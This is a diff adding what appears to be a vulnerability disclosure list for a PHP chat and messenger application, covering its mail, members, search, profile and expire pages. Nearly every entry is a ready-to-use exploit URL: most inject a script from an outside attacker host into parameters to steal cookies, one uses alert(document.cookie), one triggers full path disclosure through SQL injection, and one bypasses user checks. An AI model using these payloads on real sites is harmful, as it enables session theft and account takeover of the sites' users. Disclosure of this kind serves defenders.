@@ -1,0 +1,40 @@
+Mail Vulnerabilities: 
+
+Full path disclosure via SQL injection on id when reading mail:
+http://www.example.com/v3chat/mail/index.php?action=read&amp;mid=62&amp;id=1&#039;
+
+XSS vuln with cookie disclosure:
+http://www.example.com/v3chat/mail/index.php?action=read&amp;mid=62&amp;id=1&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&quot;&gt;
+
+Replying to mail XSS vulns:
+http://www.example.com/v3chat/mail/reply.php?&amp;recipientname=Scorpio&amp;mid=62&amp;id=1&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&quot;&gt;
+
+Members online XSS vulns with cookie disclosure:
+http://www.example.com/v3chat/members/is_online.php?membername=demo&amp;action=update&amp;login_id=&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&quot;&gt;
+
+online.php
+http://www.example.com/messenger/online.php?action=update&amp;membername=luny666&amp;site_id=&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/
+SCRIPT&gt;&quot;&gt;
+
+Adding members via Online.php Mysql error &amp; full path disclosure:
+http://www.example.com/messenger/search.php?action=update&amp;membername=&amp;action=search&amp;site_id=&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&quot;&gt;
+
+Search.php XSS vuln:
+http://www.example.com/messenger/search.php?action=update&amp;membername=&amp;action=search&amp;site_id=&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;
+
+Adding a member from search.php XSS vuln:
+
+http://www.example.com/messenger/search.php?membername=luny666&amp;memberid=287&amp;contact_id=1&amp;contact_name=&lt;IMG%20SRC=javascript:alert(document.cookie)&gt;&amp;site_id=&amp;add=1&amp;s=1
+&amp;r=0&amp;min_age=16&amp;max_age=100&amp;location=&amp;gender1=&amp;gender2=
+
+Same as above, this time on profile.php:
+http://www.example.com/messenger/profile.php?new_reg=1&amp;site_id=&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&quot;&gt;
+
+Same as above, on Profileview.php now:
+http://www.example.com/messenger/profileview.php?membername=demo&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&quot;&gt;
+
+Mycontacts.php XSS vulns with user bypass.
+http://example.com/messenger/mycontacts.php?membername=putausername
+
+Expire.php XSS vuln:
+http://example.com/messenger/expire.php?cust_name=&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT%20SRC=http://youfucktard.com/xss.js&gt;&lt;/SCRIPT&gt;&quot;&gt;
